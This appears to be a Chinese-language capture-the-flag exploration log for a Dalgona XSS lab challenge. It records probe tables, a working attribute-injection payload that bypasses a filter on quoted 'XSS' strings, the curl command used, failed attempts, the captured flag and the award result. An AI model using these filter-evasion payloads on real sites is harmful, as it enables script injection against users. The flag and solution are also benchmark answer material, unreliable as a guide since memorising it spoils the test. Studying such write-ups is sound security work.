# xben-017-24 · 探索记录

对应题解：[`xben-017-24.md`](./xben-017-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，`Werkzeug/1.0.1 Python/2.7.18`。

`GET /` → `Dalgona Challenges`，入口 `Page`。
`GET /page` 标题 `Dalgona - Triangle`，样式表 `static/css/xss/xss10.css`。

反射在**属性值**里：

```html
<input type=text name=name placeholder="Enter your name..." value="QabcQ">
```

## 第一阶段：探针

| 片段 | 反射 |
| --- | --- |
| `QabcQ` | `value="QabcQ"` |
| `Q<Q` / `Q>Q` / `Q<svgQ` | 原样 |
| `Q</Q` | 原样 |
| `QalertQ` / `QonloadQ` | 原样 |
| `Qa bQ` | 原样（空白保留） |
| **`Q"XSS"Q`** | **`value="QQ"`** ← 带引号的 XSS 被剥 |
| `'XSS'` | 整条为空 |
| `XSS`（裸） | `value="XSS"` |

结论：没有标签过滤、没有关键字过滤，但**`"XSS"` / `'XSS'` 会被剥离**。

## 第二阶段：确认引号未转义

| 输入 | 反射 |
| --- | --- |
| `a"b` | `value="a"b"` |
| `a'b` | `value="a'b"` |

可以直接闭合 `value`。

## 第三阶段：属性注入

| payload | 结果 |
| --- | --- |
| `" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="` | **Congratulations** |
| `" autofocus onfocus=top['ale'+'rt']('XSS') x="` | 失败（仍含 `'XSS'`） |
| `"autofocus onfocus=alert(1) x="`（缺空格） | 失败 |

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode \
  'name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' \
  http://$T/page
```

```html
Congratulations!<p> Here is the flag: flag{8fbc5c96-e372-43db-a292-bc5835db5f9b}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<svg/onload=alert("XSS")` | 失败 | 反射在属性里，标签不生效；且 `"XSS"` 被剥 |
| `<input autofocus onfocus=alert("XSS")>` | 失败 | 同上 |
| `top['ale'+'rt']('XSS')` | 失败 | 规避了 `alert` 但没有规避 `'XSS'` |
| `alert('XSS')`（单引号） | 整条为空 | `'XSS'` 被剥离 |
| `"autofocus onfocus=…`（缺空格） | 事件未挂上 | 闭合引号后必须空白分隔 |

## 这次真正的收获

1. **先看反射落在哪。** 这次是 `value="…"`，所以"闭合引号 + 追加属性"是最短路径；
   如果按同族其它关的经验去造 `<svg>`，会因为落在属性里而失败
   （虽然标签本身没被过滤）。
2. **"剥离带引号的 XSS" 是定向防御，正解是运行时生成字符串。**
   `String.fromCharCode(88,83,83)` 有效；而"只拆 `alert` 不拆 `XSS`"的写法
   （`top['ale'+'rt']('XSS')`）照样失败——说明这一关盯的是 `XSS` 字面量。
   这一点与 013（盯 `alert`）正好相反，值得对照记忆。
3. **属性注入的收尾与分隔符是固定套路**：`" ` 开头（引号+空格）、` x="` 收尾。
   缺空格会得到畸形属性名，这是最容易漏的一处。
4. **同族相似的正解可能来自不同原因。** 012（xss11）和本题（xss10）payload 几乎一样，
   但 012 还删 `<[A-Za-z/]`，本题不删。判断"规则相同"要看探针结果，不能看解法长相。
